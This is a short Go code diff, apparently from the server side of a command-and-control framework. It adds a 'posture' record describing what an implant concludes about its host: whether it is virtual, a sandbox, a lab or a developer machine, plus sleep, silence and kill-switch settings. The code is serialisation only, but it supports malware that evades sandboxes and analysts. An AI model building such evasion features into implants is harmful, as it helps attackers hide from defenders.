@@ -1375,6 +1375,8 @@ func agentDataMap(a *store.Agent) map[string]any {
 		"panicked": a.Panicked,
 		// What is installed on the host, and whether it is still there.
 		"persist": a.Persist,
+		// What the implant thinks of the host.
+		"posture": a.Posture,
 	}
 }
 
@@ -1538,6 +1540,24 @@ func upkValue(v any) any {
 			out = append(out, toUpkMap(item))
 		}
 		return out
+	case *store.PostureEntry:
+		// The posture of the host: what the implant thinks it is.
+		if x == nil {
+			return nil
+		}
+		return upk.Map{
+			"label":        x.Label,
+			"virtual":      x.Virtual,
+			"workstation":  x.Workstation,
+			"developer":    x.Developer,
+			"lab":          x.Lab,
+			"sandbox":      x.Sandbox,
+			"confidence":   x.Confidence,
+			"severity":     x.Severity,
+			"sleep_factor": x.SleepFactor,
+			"silent":       x.Silent,
+			"killswitch":   x.KillSwitch,
+		}
 	case []store.PersistEntry:
 		// The persistence entries of an agent: the operator has to see
 		// what is installed on the host and whether it is still there.
